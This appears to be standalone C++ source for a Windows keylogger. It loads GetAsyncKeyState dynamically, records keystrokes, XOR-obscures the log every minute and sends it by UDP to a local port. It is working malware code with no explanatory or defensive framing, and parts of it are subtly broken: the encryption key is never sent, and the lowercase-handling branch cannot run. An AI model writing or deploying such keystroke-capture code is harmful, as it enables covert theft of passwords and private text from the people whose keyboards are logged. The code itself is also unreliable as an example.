#include <windows.h>
#include <vector>
#include <ctime>
#include <sstream>

typedef SHORT(WINAPI* pGAKS)(int);
std::string Encrypt(const std::string& t, const std::string& k) { std::string e; for (size_t i = 0; i < t.size(); ++i) e += t[i] ^ k[i % k.size()]; return e; }
void SendData(const std::string& d) {
    WSADATA ws; SOCKET s; sockaddr_in sv; if (WSAStartup(MAKEWORD(2, 2), &ws) != 0) return;
    if ((s = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET) return; sv.sin_addr.s_addr = inet_addr("127.0.0.1"); sv.sin_family = AF_INET; sv.sin_port = htons(6782);
    sendto(s, d.c_str(), d.size(), 0, (struct sockaddr*)&sv, sizeof(sv)); closesocket(s); WSACleanup();
}
std::string to_string(int n) { std::ostringstream ss; ss << n; return ss.str(); }
int main() {
    HMODULE h = LoadLibraryA("user32.dll"); if (!h) return 1;
    auto GAKS = (pGAKS)GetProcAddress(h, "GetAsyncKeyState"); if (!GAKS) return FreeLibrary(h), 1;
    bool ks[256] = {0}; std::vector<char> l; time_t lst = time(0);
    while (true) {
        for (int k = 8; k <= 255; k++) {
            if ((GAKS(k) & 0x8000) && !ks[k]) {
                ks[k] = true; if (k == VK_ESCAPE) return FreeLibrary(h), 0;
                if ((k >= 'A' && k <= 'Z') || (k >= '0' && k <= '9')) l.push_back(char(k));
                else if (k == VK_SPACE) l.push_back(' ');
                else if ((k >= 'a' && k <= 'z') || (k >= 'A' && k <= 'Z')) {
                    bool shiftPressed = (GAKS(VK_SHIFT) & 0x8000) || (GAKS(VK_CAPITAL) & 0x1);
                    l.push_back(shiftPressed ? toupper(char(k)) : tolower(char(k)));
                }
            } else if (!(GAKS(k) & 0x8000)) ks[k] = false;
        }
        if (difftime(time(0), lst) >= 60) {
            if (l.size() >= 2) {
                std::string k = to_string(rand() % 900 + 100); std::string ld = "LOG:" + std::string(l.begin(), l.end());
                SendData(Encrypt(ld, k));
            }
            l.clear(); lst = time(0);
        }
        Sleep(10);
    }
}
